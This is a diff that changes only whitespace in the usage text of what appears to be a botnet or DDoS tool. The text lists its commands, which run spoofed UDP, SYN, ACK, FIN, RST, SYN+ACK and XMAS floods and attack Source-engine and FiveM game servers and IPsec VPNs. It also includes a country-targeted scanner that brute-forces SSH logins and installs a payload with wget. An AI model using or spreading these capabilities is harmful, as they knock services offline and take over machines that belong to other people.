@@ -82,20 +82,20 @@ All of the attack vectors will be <strong>random source port automatically, min 
 	
 	ATTACK VECTORS:
 	
-		?udp 	 <srcIP> <dstIP> <port> <size>			Just a normal UDP Flood attack.
-		?syn 	 <srcIP> <dstIP> <port> <size>			Just a normal SYN Flood attack.	
-		?ack 	 <srcIP> <dstIP> <port> <size>			Just a normal ACK Flood attack.
-		?fin	 <srcIP> <dstIP> <port> <size>			Flood TCP FIN packets to request close connection when target server are blocking a syn packet.
-		?rst 	 <srcIP> <dstIP> <port> <size>			Flood TCP RST packets to broke a TCP connection between client and target server.
-		?sap     <srcIP> <dstIP> <port> <size>			Flood by using TCP SYN+ACK Flags to the target server.
-		?xmas    <srcIP> <dstIP> <port> <size>			Flood TCP packets by using all of TCP Flags to target server.
-		?vse 	 <srcIP> <dstIP>				Flood TSource Engine Query request to the target game server that used valve source engine.
-		?fms 	 <srcIP> <dstIP>				Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
-		?ipsec 	 <srcIP> <dstIP>				Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
+		?udp <srcIP> <dstIP> <port> <size>		Just a normal UDP Flood attack.
+		?syn <srcIP> <dstIP> <port> <size>		Just a normal SYN Flood attack.	
+		?ack <srcIP> <dstIP> <port> <size>		Just a normal ACK Flood attack.
+		?fin <srcIP> <dstIP> <port> <size>		Flood TCP FIN packets to request close connection when target server are blocking a syn packet.
+		?rst <srcIP> <dstIP> <port> <size>		Flood TCP RST packets to broke a TCP connection between client and target server.
+		?sap <srcIP> <dstIP> <port> <size>		Flood by using TCP SYN+ACK Flags to the target server.
+		?xmas <srcIP> <dstIP> <port> <size>		Flood TCP packets by using all of TCP Flags to target server.
+		?vse <srcIP> <dstIP>				Flood TSource Engine Query request to the target game server that used valve source engine.
+		?fms <srcIP> <dstIP>				Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
+		?ipsec <srcIP> <dstIP>				Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
 	
 	SCANNER:
 	
-		?scan 	 <modes> <server>                  Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
+		?scan <modes> <server>                  Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
 	
 			-cn		Scan on china network.
 			-usa		Scan on the united state of america network.
